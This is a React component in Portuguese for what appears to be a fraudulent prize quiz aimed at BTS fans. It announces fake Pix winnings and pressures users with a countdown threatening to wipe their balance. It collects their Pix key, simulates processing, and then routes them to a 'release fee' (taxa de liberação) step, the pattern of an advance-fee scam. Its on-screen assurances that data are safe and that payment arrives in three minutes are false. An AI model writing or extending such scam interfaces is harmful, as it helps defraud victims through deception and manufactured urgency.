
import { useState } from 'react';
import { Button } from '@/components/ui/button';
import { Input } from '@/components/ui/input';
import { Label } from '@/components/ui/label';
import { Card, CardContent, CardHeader, CardTitle } from '@/components/ui/card';
import { Trophy, Clock, AlertTriangle, CheckCircle } from 'lucide-react';
import { toast } from '@/hooks/use-toast';

interface CaptureFormProps {
  score: number;
  correctAnswers: number;
  onReset: () => void;
  onTaxaLiberacao: (pixKey: string) => void;
}

const CaptureForm = ({
  score,
  correctAnswers,
  onReset,
  onTaxaLiberacao
}: CaptureFormProps) => {
  const [pixKey, setPixKey] = useState('');
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [timeLeft, setTimeLeft] = useState(15 * 60); // 15 minutos em segundos

  // Timer countdown
  useState(() => {
    const timer = setInterval(() => {
      setTimeLeft(prev => {
        if (prev <= 1) {
          clearInterval(timer);
          return 0;
        }
        return prev - 1;
      });
    }, 1000);
    return () => clearInterval(timer);
  });

  const formatTime = (seconds: number) => {
    const mins = Math.floor(seconds / 60);
    const secs = seconds % 60;
    return `${mins.toString().padStart(2, '0')}:${secs.toString().padStart(2, '0')}`;
  };

  const handleInputChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    setPixKey(e.target.value);
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!pixKey) {
      toast({
        title: "Campo obrigatório",
        description: "Por favor, preencha sua chave Pix para sacar seu prêmio!",
        variant: "destructive"
      });
      return;
    }
    
    setIsSubmitting(true);

    // Simular processamento e ir para taxa de liberação
    setTimeout(() => {
      setIsSubmitting(false);
      onTaxaLiberacao(pixKey);
    }, 1000);
  };

  const canWithdraw = correctAnswers >= 3;

  if (timeLeft === 0) {
    return (
      <div className="fixed inset-0 bg-gradient-to-br from-red-900 via-red-800 to-red-700 flex items-center justify-center p-4 overflow-hidden">
        <Card className="max-w-sm mx-auto text-center border-2 border-red-300">
          <CardContent className="p-6">
            <AlertTriangle className="w-12 h-12 text-red-500 mx-auto mb-3" />
            <h2 className="text-xl font-bold text-red-600 mb-3">Tempo Esgotado!</h2>
            <p className="text-gray-600 mb-4 text-sm">
              Infelizmente o tempo para saque expirou. Seu saldo foi zerado.
            </p>
            <Button onClick={onReset} className="bg-purple-600 hover:bg-purple-700">
              Jogar Novamente
            </Button>
          </CardContent>
        </Card>
      </div>
    );
  }

  return (
    <div className="fixed inset-0 bg-gradient-to-br from-purple-900 via-purple-800 to-pink-800 flex flex-col overflow-hidden">
      {/* Header com resultado - fixo no topo */}
      <div className="flex-shrink-0 text-center p-4 pt-6">
        <Trophy className="w-10 h-10 text-yellow-400 mx-auto mb-2" />
        <h1 className="text-xl font-bold text-white mb-2">
          🎉 Parabéns, ARMY!
        </h1>
        
        {canWithdraw ? <>
            <div className="bg-gradient-to-r from-green-500 to-green-600 text-white px-4 py-2 rounded-xl text-lg font-bold mb-2 shadow-lg">
              Você acumulou R${score},00!
            </div>
            <p className="text-white/90 text-sm">
              Você acertou {correctAnswers} de 5 perguntas! 🏆
            </p>
          </> : <>
            <div className="bg-gradient-to-r from-orange-500 to-orange-600 text-white px-4 py-2 rounded-xl text-lg font-bold mb-2 shadow-lg">
              Você acumulou R${score},00
            </div>
            <p className="text-white/90 text-sm mb-2">
              Você acertou {correctAnswers} de 5 perguntas
            </p>
            <div className="bg-red-500/20 border border-red-400 rounded-lg p-3 text-white text-xs">
              <AlertTriangle className="w-4 h-4 inline mr-1" />
              Você precisa acertar pelo menos 3 perguntas para sacar via Pix
            </div>
          </>}
      </div>

      {canWithdraw ? (
        <>
          {/* Aviso de urgência */}
          <div className="flex-shrink-0 px-4 pb-3">
            <Card className="border-2 border-red-400 bg-red-50">
              <CardContent className="p-3">
                <div className="flex items-center gap-2 text-red-600">
                  <Clock className="w-4 h-4 flex-shrink-0" />
                  <div className="text-xs">
                    <div className="font-bold">⏰ ATENÇÃO! Tempo limitado</div>
                    <div>
                      Você tem <span className="font-bold">{formatTime(timeLeft)}</span> para sacar.
                      Após esse tempo, seu saldo será zerado!
                    </div>
                  </div>
                </div>
              </CardContent>
            </Card>
          </div>

          {/* Formulário - área principal */}
          <div className="flex-1 px-4 pb-4">
            <Card className="border-2 border-yellow-400 shadow-2xl h-full">
              <CardHeader className="bg-gradient-to-r from-yellow-400 to-yellow-500 p-3 flex-shrink-0">
                <CardTitle className="text-center text-lg font-bold text-gray-800">💰 Informe Sua Chave PIX 💰</CardTitle>
              </CardHeader>
              <CardContent className="p-4 flex flex-col justify-between h-full">
                <form onSubmit={handleSubmit} className="flex flex-col justify-between h-full">
                  <div className="space-y-4">
                    <div>
                      <Label htmlFor="pixKey" className="text-sm font-semibold">Chave Pix *</Label>
                      <Input id="pixKey" name="pixKey" type="text" placeholder="CPF, e-mail, telefone ou chave aleatória" value={pixKey} onChange={handleInputChange} required className="mt-1 text-sm h-12" />
                    </div>
                  </div>

                  {/* Seção inferior com botão e informações */}
                  <div className="mt-6 space-y-4">
                    <Button type="submit" disabled={isSubmitting} className="w-full bg-gradient-to-r from-green-600 to-green-700 hover:from-green-700 hover:to-green-800 text-white font-bold py-4 text-base shadow-lg">
                      {isSubmitting ? "Processando..." : <>
                          <CheckCircle className="w-4 h-4 mr-2" />
                          SACAR R${score},00 VIA PIX
                        </>}
                    </Button>

                    <div className="text-center text-xs text-gray-600">
                      🔒 Seus dados estão seguros conosco.<br />
                      📱 O Pix será enviado em até 3 minutos.
                    </div>
                  </div>
                </form>
              </CardContent>
            </Card>
          </div>
        </>
      ) : (
        <div className="flex-1 flex items-center justify-center px-4">
          <Button onClick={onReset} className="bg-gradient-to-r from-purple-600 to-pink-600 hover:from-purple-700 hover:to-pink-700 text-white font-bold px-8 py-4 text-lg">
            Tentar Novamente
          </Button>
        </div>
      )}
    </div>
  );
};

export default CaptureForm;
